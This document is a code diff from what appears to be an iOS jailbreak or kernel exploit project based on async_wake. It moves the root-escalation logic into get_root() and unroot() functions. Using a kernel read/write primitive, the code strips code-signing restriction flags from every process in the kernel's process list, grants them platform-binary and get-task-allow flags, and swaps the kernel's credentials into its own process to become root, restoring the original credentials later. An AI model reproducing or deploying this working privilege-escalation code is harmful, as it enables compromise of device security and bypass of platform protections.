@@ -704,11 +704,9 @@ char* bundle_path() {
     return path;
 }
 
-// thx ianbeer for async_wake
-// proc_for_pid based on cheesecakeufo code
-// by stek29: https://gist.github.com/stek29/8b808986e7ee3c204bfb76d69577812f
-
-// find bsd_info from our own task_self_addr
+/* thx ianbeer for async_wake
+   proc_for_pid based on cheesecakeufo code
+   find bsd_info from our own task_self_addr */
 uint64_t proc_for_pid(uint32_t pid) {
     uint64_t task_self = task_self_addr();
     uint64_t struct_task = rk64(task_self + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
@@ -727,7 +725,37 @@ uint64_t proc_for_pid(uint32_t pid) {
     exit(EXIT_FAILURE);
 }
 
-void go() {
+uint64_t get_root(){
+    printf("[INFO]: new uid: %d\n", getuid());
+    uint64_t bsd_task=proc_for_pid(getpid());
+    uint64_t cred = rk64(bsd_task+0x100);
+    
+    uint64_t credpatch = 0;
+    uint64_t proc = bsd_task;
+    while (proc) {
+        uint32_t pid = rk32(proc+0x10);
+        uint32_t csflags = rk32(proc+0x2a8);
+        csflags |= CS_PLATFORM_BINARY|CS_INSTALLER|CS_GET_TASK_ALLOW;
+        csflags &= ~(CS_RESTRICT|CS_KILL|CS_HARD);
+        wk32(proc+0x2a8, csflags);
+        if (pid == 0) {
+            credpatch = rk64(proc+0x100);
+            break;
+        }
+        proc = rk64(proc);
+    }
+    uint64_t orig_cred = cred;
+    wk64(bsd_task+0x100, credpatch);
+    printf("[INFO]: new uid: %d\n", getuid());
+    return orig_cred;
+}
+
+void unroot(uint64_t orig_cred){
+    uint64_t bsd_task=proc_for_pid(getpid());
+    wk64(bsd_task+0x100, orig_cred);
+}
+
+mach_port_t go() {
   mach_port_t tfp0 = get_kernel_memory_rw();
   printf("tfp0: %x\n", tfp0);
     
@@ -742,26 +770,8 @@ void go() {
      
      */
 
-    uint64_t bsd_task=proc_for_pid(getpid());
-    uint64_t cred = rk64(bsd_task+0x100);
-      
-    uint64_t credpatch = 0;
-    uint64_t proc = bsd_task;
-    while (proc) {
-      uint32_t pid = rk32(proc+0x10);
-      uint32_t csflags = rk32(proc+0x2a8);
-      csflags |= CS_PLATFORM_BINARY|CS_INSTALLER|CS_GET_TASK_ALLOW;
-      csflags &= ~(CS_RESTRICT|CS_KILL|CS_HARD);
-      wk32(proc+0x2a8, csflags);
-      if (pid == 0) {
-          credpatch = rk64(proc+0x100);
-          break;
-      }
-      proc = rk64(proc);
-    }
-    uint64_t orig_cred = cred;
-    wk64(bsd_task+0x100, credpatch);
-    printf("[INFO]: new uid: %d\n", getuid());
+    uint64_t orig_cred = get_root();
+    
     // do root stuff below
     
     /*
@@ -792,11 +802,13 @@ void go() {
     }
 
     //set uid back
-    wk64(bsd_task+0x100, orig_cred);
+    unroot(orig_cred);
     sleep(2);
     
     if (probably_have_correct_symbols()) {
         printf("have symbols for this device, testing the kernel debugger...\n");
         test_kdbg();
     }
+    
+    return tfp0;
 }
